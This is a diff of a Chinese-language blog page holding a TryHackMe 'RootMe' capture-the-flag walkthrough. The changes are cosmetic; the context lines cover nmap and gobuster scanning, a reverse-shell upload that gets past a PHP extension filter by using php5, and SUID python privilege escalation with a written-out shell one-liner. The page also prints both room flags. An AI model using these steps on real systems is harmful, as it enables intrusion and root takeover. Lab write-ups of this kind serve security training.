@@ -27,7 +27,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://itanyu.cn/img/default_tryhackme.png">
 <meta property="article:published_time" content="2024-03-05T07:48:55.000Z">
-<meta property="article:modified_time" content="2024-03-05T07:59:16.780Z">
+<meta property="article:modified_time" content="2024-03-06T07:30:14.512Z">
 <meta property="article:author" content="CQ-tanyu">
 <meta property="article:tag" content="Thm">
 <meta name="twitter:card" content="summary_large_image">
@@ -285,9 +285,9 @@
 <p>（本次房间用到的是TryHackMe的漏洞盒子）</p>
 <p>看名字就知道这个房间涉及到提权</p>
 <p>先看一下我们的任务</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h2><p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_11-26-03.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2024-02-04_11-26-03"></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h2><p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_11-26-03.png" srcset="/img/loading.gif" lazyload></p>
 <p>打开网站看一看</p>
-<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-11-46.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2024-02-04_12-11-46"></p>
+<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-11-46.png" srcset="/img/loading.gif" lazyload></p>
 <p>直接Nmap开扫</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -A -sC -sV 10.10.81.56<br></code></pre></td></tr></table></figure>
 
@@ -346,34 +346,34 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@ip-10-10-8-87:~# gobuster dir -u 10.10.81.56 -w &#x27;/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt&#x27; <br>===============================================================<br>Gobuster v3.0.1<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)<br>===============================================================<br>[+] Url:            http://10.10.81.56<br>[+] Threads:        10<br>[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt<br>[+] Status codes:   200,204,301,302,307,401,403<br>[+] User Agent:     gobuster/3.0.1<br>[+] Timeout:        10s<br>===============================================================<br>2024/02/04 03:49:30 Starting gobuster<br>===============================================================<br>/uploads (Status: 301)<br>/css (Status: 301)<br>/js (Status: 301)<br>/panel (Status: 301)<br>===============================================================<br>2024/02/04 03:49:39 Finished<br>===============================================================<br></code></pre></td></tr></table></figure>
 
 <p>可能为隐藏目录：&#x2F;panel&#x2F;</p>
-<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-09-28.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2024-02-04_12-09-28"></p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-09-28.png" srcset="/img/loading.gif" lazyload></p>
 <p>查看隐藏目录，为文件上传</p>
-<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-13-22.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2024-02-04_12-13-22"></p>
+<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-13-22.png" srcset="/img/loading.gif" lazyload></p>
 <p>接下来上传反向shell</p>
-<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-18-46.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2024-02-04_12-18-46"></p>
+<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-18-46.png" srcset="/img/loading.gif" lazyload></p>
 <p>发现不允许php文件类型上传</p>
-<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-19-21.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2024-02-04_12-19-21"></p>
+<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-19-21.png" srcset="/img/loading.gif" lazyload></p>
 <p>可以用BurpSuite进行请求包修改</p>
-<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-25-24.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2024-02-04_12-25-24"></p>
-<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-25-51.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2024-02-04_12-25-51"></p>
+<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-25-24.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-25-51.png" srcset="/img/loading.gif" lazyload></p>
 <p>通过响应包长度可以看到允许txt，php5文件类型上传</p>
-<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-30-13.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2024-02-04_12-30-13"></p>
+<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-30-13.png" srcset="/img/loading.gif" lazyload></p>
 <p>接下来执行shell文件</p>
-<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-33-07.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2024-02-04_12-33-07"></p>
+<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-33-07.png" srcset="/img/loading.gif" lazyload></p>
 <p>成功连接上shell后，查找user.txt文件</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find -name user.txt<br></code></pre></td></tr></table></figure>
 
 <p>结果文件太多了QAQ</p>
-<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-38-57.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2024-02-04_12-38-57"></p>
+<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-38-57.png" srcset="/img/loading.gif" lazyload></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -type f -name user.txt 2&gt; /dev/null<br></code></pre></td></tr></table></figure>
 
 <p>将其它所有内容都设置为null</p>
-<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-45-16.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2024-02-04_12-45-16"></p>
+<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-45-16.png" srcset="/img/loading.gif" lazyload></p>
 <p>user.txt文件路径：&#x2F;var&#x2F;www&#x2F;user.txt</p>
 <p>user.txt文件内容：THM{y0u_g0t_a_sh3ll}</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-48-52.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2024-02-04_12-48-52"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_12-48-52.png" srcset="/img/loading.gif" lazyload></p>
 <p><strong>现在已经入侵了这台机器，我们将升级权限并成为超级用户（root）</strong></p>
-<p><img src="/img/Thm/RootMe/20231222100903434.webp" srcset="/img/loading.gif" lazyload alt="20231222100903434"></p>
+<p><img src="/img/Thm/RootMe/20231222100903434.webp" srcset="/img/loading.gif" lazyload></p>
 <p>在Linux中，SUID（<strong>执行时设置所有者 userId</strong>）是赋予文件的一种特定类型的文件权限。SUID 向用户授予临时权限，以在文件所有者（而不是运行它的用户）的许可下运行程序&#x2F;文件。</p>
 <p>例如，用于更改密码的二进制文件设置了 SUID 位 (&#x2F;usr&#x2F;bin&#x2F;passwd)。这是因为要更改您的密码；它将需要写入您无权访问的 Shadowers 文件，而 root 可以；因此它具有 root 权限来进行正确的更改。</p>
 <table>
@@ -400,18 +400,18 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -type f -user root -perm -u=s 2&gt; /dev/null<br></code></pre></td></tr></table></figure>
 
 <p>这些都是具有SUID权限的文件，其中Python可以作为设置UID运行</p>
-<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_13-03-11.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2024-02-04_13-03-11"></p>
+<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_13-03-11.png" srcset="/img/loading.gif" lazyload></p>
 <p>可疑文件：&#x2F;usr&#x2F;bin&#x2F;python</p>
 <p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a>查找Python</p>
-<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_13-52-13.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2024-02-04_13-52-13"></p>
+<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_13-52-13.png" srcset="/img/loading.gif" lazyload></p>
 <p>进行提权</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python -c &#x27;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_13-54-25.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2024-02-04_13-54-25"></p>
+<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_13-54-25.png" srcset="/img/loading.gif" lazyload></p>
 <p>最后查找root.txt文件内容</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -type f -name root.txt 2&gt; /dev/null<br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_13-59-51.png" srcset="/img/loading.gif" lazyload alt="Snipaste_2024-02-04_13-59-51"></p>
+<p><img src="/img/Thm/RootMe/Snipaste_2024-02-04_13-59-51.png" srcset="/img/loading.gif" lazyload></p>
 <p>root.txt文件内容：THM{pr1v1l3g3_3sc4l4t10n}</p>
 
                 
